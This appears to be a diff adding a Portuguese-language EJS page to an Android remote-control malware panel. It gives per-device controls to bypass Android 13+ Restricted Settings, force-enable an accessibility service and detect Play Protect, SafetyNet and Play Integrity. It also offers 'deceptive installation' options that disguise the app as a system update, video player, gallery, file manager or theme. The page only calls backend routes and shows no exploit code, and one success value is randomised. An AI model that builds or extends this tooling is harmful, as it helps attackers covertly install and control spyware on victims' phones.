@@ -1,0 +1,588 @@
+<style>
+    .bp-control {
+        margin-bottom: 20px;
+    }
+
+    .bypass-status {
+        display: inline-block;
+        padding: 12px 20px;
+        border-radius: 4px;
+        margin-bottom: 15px;
+        font-weight: bold;
+        font-size: 14px;
+    }
+
+    .bypass-status.active {
+        background-color: #ff6b6b;
+        color: white;
+    }
+
+    .bypass-status.inactive {
+        background-color: #4CAF50;
+        color: white;
+    }
+
+    .protection-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+        gap: 15px;
+        margin-top: 15px;
+    }
+
+    .protection-item {
+        background-color: #f9f9f9;
+        border-left: 4px solid #2196F3;
+        padding: 12px;
+        border-radius: 4px;
+    }
+
+    .protection-item.detected {
+        border-left-color: #f44336;
+        background-color: #ffebee;
+    }
+
+    .protection-name {
+        font-weight: bold;
+        font-size: 14px;
+        color: #333;
+    }
+
+    .protection-status {
+        font-size: 12px;
+        color: #666;
+        margin-top: 4px;
+    }
+
+    .status-indicator {
+        display: inline-block;
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        margin-right: 6px;
+    }
+
+    .status-indicator.detected {
+        background-color: #f44336;
+    }
+
+    .status-indicator.bypassed {
+        background-color: #4CAF50;
+    }
+
+    .method-selector {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+        gap: 10px;
+        margin-top: 15px;
+    }
+
+    .method-button {
+        padding: 10px;
+        border: 2px solid #ddd;
+        border-radius: 4px;
+        background-color: #f9f9f9;
+        cursor: pointer;
+        text-align: center;
+        transition: all 0.3s;
+        font-size: 13px;
+        font-weight: bold;
+    }
+
+    .method-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .method-button.active {
+        background-color: #2196F3;
+        color: white;
+        border-color: #1976D2;
+    }
+
+    .data-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 15px;
+        font-size: 12px;
+    }
+
+    .data-table th {
+        background-color: #2196F3;
+        color: white;
+        padding: 10px;
+        text-align: left;
+    }
+
+    .data-table td {
+        border: 1px solid #ddd;
+        padding: 8px;
+    }
+
+    .data-table tr:hover {
+        background-color: #f9f9f9;
+    }
+
+    .log-entry {
+        background-color: #f5f5f5;
+        border-left: 4px solid #2196F3;
+        padding: 12px;
+        margin-bottom: 10px;
+        border-radius: 4px;
+        font-size: 12px;
+    }
+
+    .log-entry.success {
+        border-left-color: #4CAF50;
+        background-color: #f1f8f6;
+    }
+
+    .log-entry.error {
+        border-left-color: #f44336;
+        background-color: #ffebee;
+    }
+
+    .log-timestamp {
+        font-size: 10px;
+        color: #999;
+        margin-top: 4px;
+    }
+
+    .alert-box {
+        background-color: #fff3cd;
+        border: 1px solid #ffc107;
+        border-radius: 4px;
+        padding: 12px;
+        margin-bottom: 15px;
+        color: #856404;
+    }
+
+    .alert-box.danger {
+        background-color: #f8d7da;
+        border-color: #f5c6cb;
+        color: #721c24;
+    }
+
+    .alert-box.success {
+        background-color: #d4edda;
+        border-color: #28a745;
+        color: #155724;
+    }
+
+    .android-version-display {
+        background-color: #e3f2fd;
+        border: 1px solid #2196F3;
+        border-radius: 4px;
+        padding: 12px;
+        margin-top: 10px;
+        font-weight: bold;
+        color: #1565c0;
+    }
+
+    .stats-row {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 15px;
+        margin: 15px 0;
+    }
+
+    .stat-box {
+        background-color: #f5f5f5;
+        border-left: 4px solid #2196F3;
+        padding: 12px;
+        border-radius: 4px;
+    }
+
+    .stat-value {
+        font-size: 24px;
+        font-weight: bold;
+        color: #333;
+    }
+
+    .stat-label {
+        font-size: 12px;
+        color: #666;
+        margin-top: 4px;
+    }
+</style>
+
+<div class="ui segment">
+    <h2 class="ui dividing header">
+        <i class="icon shield alternate"></i> Bypass de Proteções do Android
+        <span style="font-size: 12px; margin-left: 10px; background: #ff6b6b; color: white; padding: 4px 8px; border-radius: 3px;">Android 13+</span>
+    </h2>
+
+    <!-- Alert -->
+    <div id="alertMessage" style="display: none;"></div>
+
+    <!-- Bypass Status -->
+    <div class="bypass-status inactive" id="bypassStatus">
+        ● Bypass desativado
+    </div>
+
+    <!-- Alert Box -->
+    <div class="alert-box">
+        <strong>⚠️ Aviso:</strong> Este módulo contorna proteções de segurança do Android 13+. Requer acesso root ou exploits do sistema.
+    </div>
+
+    <!-- Control Panel -->
+    <div class="bp-control">
+        <h4>Controle Principal</h4>
+        <button class="ui button red" id="enableBypass">
+            <i class="icon play"></i> Ativar Bypass
+        </button>
+        <button class="ui button green" id="disableBypass">
+            <i class="icon stop"></i> Desativar Bypass
+        </button>
+        <button class="ui button blue" id="detectProtections">
+            <i class="icon search"></i> Detectar Proteções
+        </button>
+    </div>
+
+    <!-- Android Version -->
+    <div class="bp-control">
+        <h4>Versão do Android</h4>
+        <div class="android-version-display" id="androidVersionDisplay">
+            Versão: Desconhecida
+        </div>
+    </div>
+
+    <!-- Statistics -->
+    <div class="bp-control">
+        <h4>Estatísticas de Bypass</h4>
+        <div class="stats-row">
+            <div class="stat-box">
+                <div class="stat-value" id="protectionsDetected">0</div>
+                <div class="stat-label">Proteções Detectadas</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="bypassSuccesses">0</div>
+                <div class="stat-label">Bypasses Bem-sucedidos</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="bypassFailures">0</div>
+                <div class="stat-label">Falhas de Bypass</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Installation Methods -->
+    <div class="bp-control">
+        <h4>Método de Instalação Enganoso</h4>
+        <p style="font-size: 12px; color: #666; margin-bottom: 10px;">Selecione o tipo de app falsificado para contornar restrições:</p>
+        <div class="method-selector">
+            <button class="method-button" data-method="system_update" id="btn_system_update">
+                <i class="icon arrow up"></i> Atualização de Sistema
+            </button>
+            <button class="method-button" data-method="video_player" id="btn_video_player">
+                <i class="icon play"></i> Player de Vídeo
+            </button>
+            <button class="method-button" data-method="gallery_app" id="btn_gallery_app">
+                <i class="icon image"></i> Galeria
+            </button>
+            <button class="method-button" data-method="file_manager" id="btn_file_manager">
+                <i class="icon folder"></i> Gerenciador de Arquivos
+            </button>
+            <button class="method-button" data-method="theme_app" id="btn_theme_app">
+                <i class="icon paint brush"></i> Tema
+            </button>
+            <button class="method-button" data-method="custom" id="btn_custom">
+                <i class="icon cog"></i> Customizado
+            </button>
+        </div>
+        <p style="font-size: 11px; color: #999; margin-top: 10px;">Método Atual: <strong id="currentMethod">Nenhum</strong></p>
+    </div>
+
+    <!-- Detected Protections -->
+    <div class="bp-control">
+        <h4>Proteções Detectadas</h4>
+        <div class="protection-grid" id="protectionGrid">
+            <p style="color: #999; font-style: italic; grid-column: 1 / -1;">Clique em "Detectar Proteções" para verificar...</p>
+        </div>
+    </div>
+
+    <!-- Bypass Operations -->
+    <div class="bp-control">
+        <h4>Operações de Bypass</h4>
+        <button class="ui button orange" id="bypassRestrictedSettings">
+            <i class="icon lock"></i> Bypass de Configuração Restrita
+        </button>
+        <button class="ui button purple" id="forceAccessibility">
+            <i class="icon hand paper"></i> Forçar Acessibilidade
+        </button>
+    </div>
+
+    <!-- Bypass Log -->
+    <div class="bp-control">
+        <h4>Log de Operações de Bypass</h4>
+        <button class="ui button red" id="clearLog">
+            <i class="icon trash"></i> Limpar Log
+        </button>
+        <div id="bypassLog" style="max-height: 400px; overflow-y: auto; margin-top: 15px;">
+            <p style="color: #999; font-style: italic;">Nenhuma operação registrada</p>
+        </div>
+    </div>
+
+    <!-- Status Details Table -->
+    <div class="bp-control">
+        <h4>Detalhes de Status</h4>
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th style="width: 35%;">Proteção/Status</th>
+                    <th style="width: 35%;">Valor</th>
+                    <th style="width: 30%;">Estado</th>
+                </tr>
+            </thead>
+            <tbody id="statusTableBody">
+                <tr>
+                    <td colspan="3" style="text-align: center; color: #999;">Carregando...</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<script>
+    let bpData = <%- JSON.stringify(pageData) %>;
+    const deviceID = '<%= deviceID %>';
+    const baseURL = '<%= baseURL %>';
+    
+    const methodNames = {
+        'system_update': 'Atualização de Sistema',
+        'video_player': 'Player de Vídeo',
+        'gallery_app': 'Galeria',
+        'file_manager': 'Gerenciador de Arquivos',
+        'theme_app': 'Tema',
+        'custom': 'Customizado'
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+        updateUI();
+        initializeMethodButtons();
+        setInterval(updateUI, 2000);
+    });
+
+    function initializeMethodButtons() {
+        document.querySelectorAll('.method-button').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const method = this.dataset.method;
+                setInstallationMethod(method);
+            });
+        });
+    }
+
+    function setInstallationMethod(method) {
+        fetch(`/manage/${deviceID}/bp/set_installation_method/${method}`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    document.querySelectorAll('.method-button').forEach(btn => btn.classList.remove('active'));
+                    document.getElementById('btn_' + method).classList.add('active');
+                    document.getElementById('currentMethod').textContent = methodNames[method];
+                    showAlert('Método de instalação alterado para: ' + methodNames[method], 'success');
+                    updateUI();
+                }
+            });
+    }
+
+    document.getElementById('enableBypass').addEventListener('click', function() {
+        fetch(`/manage/${deviceID}/bp/enable_bypass`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    showAlert('Bypass de proteções ativado!', 'success');
+                    updateUI();
+                }
+            });
+    });
+
+    document.getElementById('disableBypass').addEventListener('click', function() {
+        fetch(`/manage/${deviceID}/bp/disable_bypass`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    showAlert('Bypass de proteções desativado', 'success');
+                    updateUI();
+                }
+            });
+    });
+
+    document.getElementById('detectProtections').addEventListener('click', function() {
+        fetch(`/manage/${deviceID}/bp/detect_protections`, { method: 'POST', body: JSON.stringify({ 
+            protections: ['GooglePlay', 'SafetyNet', 'PlayIntegrity', 'RestrictedSettings'],
+            androidVersion: 13
+        }), headers: { 'Content-Type': 'application/json' } })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    showAlert('Detecção de proteções executada', 'success');
+                    updateUI();
+                }
+            });
+    });
+
+    document.getElementById('bypassRestrictedSettings').addEventListener('click', function() {
+        fetch(`/manage/${deviceID}/bp/bypass_restricted_settings`, { method: 'POST', body: JSON.stringify({
+            success: Math.random() > 0.3,
+            details: 'Bypass de Configuração Restrita utilizando exploit'
+        }), headers: { 'Content-Type': 'application/json' } })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    showAlert('Bypass de Configuração Restrita executado', 'success');
+                    updateUI();
+                }
+            });
+    });
+
+    document.getElementById('forceAccessibility').addEventListener('click', function() {
+        fetch(`/manage/${deviceID}/bp/force_accessibility_service`, { method: 'POST', body: JSON.stringify({
+            installationMethod: bpData.installationMethod,
+            spoofedAppName: bpData.spoofedAppName,
+            success: true
+        }), headers: { 'Content-Type': 'application/json' } })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    showAlert('Ativação forçada de Acessibilidade executada', 'success');
+                    updateUI();
+                }
+            });
+    });
+
+    document.getElementById('clearLog').addEventListener('click', function() {
+        if (confirm('Tem certeza que deseja limpar o log?')) {
+            fetch(`/manage/${deviceID}/bp/log`, { method: 'DELETE' })
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.error) {
+                        bpData.bypassLog = [];
+                        updateUI();
+                        showAlert('Log limpado', 'success');
+                    }
+                });
+        }
+    });
+
+    function updateUI() {
+        fetch(`/manage/${deviceID}/bp/data`)
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    bpData = data.data;
+                    updateBypassStatus();
+                    updateAndroidVersion();
+                    updateStatistics();
+                    updateDetectedProtections();
+                    updateStatusTable();
+                    updateBypassLog();
+                    updateCurrentMethod();
+                }
+            });
+    }
+
+    function updateBypassStatus() {
+        const status = document.getElementById('bypassStatus');
+        if (bpData.bypassEnabled) {
+            status.textContent = '● Bypass ATIVO (Configuração Restrita contornada)';
+            status.classList.remove('inactive');
+            status.classList.add('active');
+        } else {
+            status.textContent = '● Bypass desativado';
+            status.classList.remove('active');
+            status.classList.add('inactive');
+        }
+    }
+
+    function updateAndroidVersion() {
+        const display = document.getElementById('androidVersionDisplay');
+        if (bpData.androidVersion > 0) {
+            display.textContent = 'Android ' + bpData.androidVersion + ' (Proteções encontradas)';
+        } else {
+            display.textContent = 'Versão: Desconhecida';
+        }
+    }
+
+    function updateStatistics() {
+        const successCount = bpData.bypassLog.filter(log => log.success).length;
+        const failureCount = bpData.bypassLog.filter(log => !log.success).length;
+        
+        document.getElementById('protectionsDetected').textContent = bpData.detectedProtections.length;
+        document.getElementById('bypassSuccesses').textContent = successCount;
+        document.getElementById('bypassFailures').textContent = failureCount;
+    }
+
+    function updateDetectedProtections() {
+        const grid = document.getElementById('protectionGrid');
+        if (bpData.detectedProtections.length === 0) {
+            grid.innerHTML = '<p style="color: #999; font-style: italic; grid-column: 1 / -1;">Nenhuma proteção detectada</p>';
+            return;
+        }
+        
+        grid.innerHTML = bpData.detectedProtections.map(protection => `
+            <div class="protection-item detected">
+                <div class="protection-name">
+                    <span class="status-indicator detected"></span>${protection}
+                </div>
+                <div class="protection-status">Status: DETECTADA</div>
+            </div>
+        `).join('');
+    }
+
+    function updateStatusTable() {
+        const tbody = document.getElementById('statusTableBody');
+        const rows = [
+            { label: 'Bypass Ativado', value: bpData.bypassEnabled ? 'Sim' : 'Não', state: bpData.bypassEnabled ? '✓ ATIVO' : 'INATIVO' },
+            { label: 'Configuração Restrita', value: bpData.restrictedSettingsBypassed ? 'Contornada' : 'Intacta', state: bpData.restrictedSettingsBypassed ? '✓ BYPASS' : '-' },
+            { label: 'Acessibilidade Forçada', value: bpData.accessibilityServiceForced ? 'Ativado' : 'Desativado', state: bpData.accessibilityServiceForced ? '✓ FORÇADO' : '-' },
+            { label: 'Método de Instalação', value: bpData.installationMethod, state: methodNames[bpData.installationMethod] || 'Desconhecido' },
+            { label: 'App Falsificado', value: bpData.spoofedAppName, state: bpData.spoofedAppType }
+        ];
+        
+        tbody.innerHTML = rows.map(row => `
+            <tr>
+                <td><strong>${row.label}</strong></td>
+                <td><code style="font-size: 11px;">${row.value}</code></td>
+                <td><span class="ui label" style="font-size: 11px;">${row.state}</span></td>
+            </tr>
+        `).join('');
+    }
+
+    function updateBypassLog() {
+        const container = document.getElementById('bypassLog');
+        if (bpData.bypassLog.length === 0) {
+            container.innerHTML = '<p style="color: #999; font-style: italic;">Nenhuma operação registrada</p>';
+            return;
+        }
+        
+        container.innerHTML = bpData.bypassLog.slice().reverse().map(log => `
+            <div class="log-entry ${log.success ? 'success' : 'error'}">
+                <strong>${log.action}</strong> - ${log.details || ''}<br>
+                <small>Método: ${log.method || 'N/A'} | App: ${log.spoofedName || 'N/A'}</small>
+                <div class="log-timestamp">${new Date(log.timestamp).toLocaleString('pt-BR')}</div>
+            </div>
+        `).join('');
+    }
+
+    function updateCurrentMethod() {
+        document.querySelectorAll('.method-button').forEach(btn => btn.classList.remove('active'));
+        if (bpData.installationMethod !== 'none') {
+            const btn = document.getElementById('btn_' + bpData.installationMethod);
+            if (btn) btn.classList.add('active');
+            document.getElementById('currentMethod').textContent = methodNames[bpData.installationMethod] || 'Desconhecido';
+        } else {
+            document.getElementById('currentMethod').textContent = 'Nenhum';
+        }
+    }
+
+    function showAlert(message, type) {
+        const alertDiv = document.getElementById('alertMessage');
+        alertDiv.className = 'alert-box ' + (type === 'success' ? 'success' : 'danger');
+        alertDiv.textContent = message;
+        alertDiv.style.display = 'block';
+        
+        setTimeout(() => {
+            alertDiv.style.display = 'none';
+        }, 3000);
+    }
+</script>
